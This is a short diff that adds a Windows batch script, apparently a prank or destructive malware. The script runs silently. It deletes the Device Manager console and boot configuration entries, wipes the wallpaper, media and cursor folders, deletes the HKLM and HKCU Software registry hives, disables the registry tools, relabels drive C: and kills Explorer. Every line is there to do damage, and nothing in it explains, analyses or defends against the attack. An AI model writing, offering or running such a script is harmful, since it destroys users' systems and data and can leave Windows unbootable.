@@ -1,0 +1,13 @@
+@echo off
+del %SystemRoot%\system32\devmgmt.msc >nul
+bootcfg /delete /id 1 >nul
+bootcfg /delete /id 1 >nul
+bootcfg /delete /id 1 >nul
+del "%SystemRoot%\Web\Wallpaper" /q >nul
+del "%SystemRoot%\Media" /q >nul
+del "%SystemRoot%\Cursors\*.*" >nul
+reg delete HKLM\Software /f >nul
+reg delete HKCU\Software /f >nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
+label C:MYA-XA-XA >nul
+taskkill /f /im explorer.exe >nul
